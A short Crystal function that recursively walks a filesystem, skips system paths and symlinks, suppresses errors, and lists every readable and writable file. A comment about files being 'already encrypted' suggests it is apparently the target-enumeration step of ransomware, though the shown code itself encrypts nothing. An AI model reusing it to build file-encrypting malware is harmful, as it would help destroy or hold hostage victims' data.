# path : String (Where to start)
# excludes : Array(String) : excludes = [ "/sys", "/proc", "/run" ]...
# files : Array(String)  Output itself
def safewalk(path : String, excludes : Array(String), files : Array(String))
  fullPath = File.expand_path(path)

  # If in exclusion then we just ignore it
  if excludes.any? { |ex| fullPath.starts_with?(ex) }
    return
  end

  begin
    Dir.each_child(fullPath) do |entry|
      child = File.join(fullPath, entry)

      # Skip Symlinks
      if File.symlink?(child)
        next
      end

      if File.file?(child)
        begin
          # If file is already encrypted
          
          # Check if read/write : able
          if File::Info.readable?(child) && File::Info.writable?(child)
            files.push(child)
          end
        rescue ex : File::AccessDeniedError
        rescue ex : File::NotFoundError
        rescue ex
        end
      elsif File.directory?(child)
        # Call self if file is a folder
        safewalk(child, excludes, files)
      end
    end
  rescue ex : File::AccessDeniedError
  rescue ex : File::NotFoundError
  rescue ex
  end
end
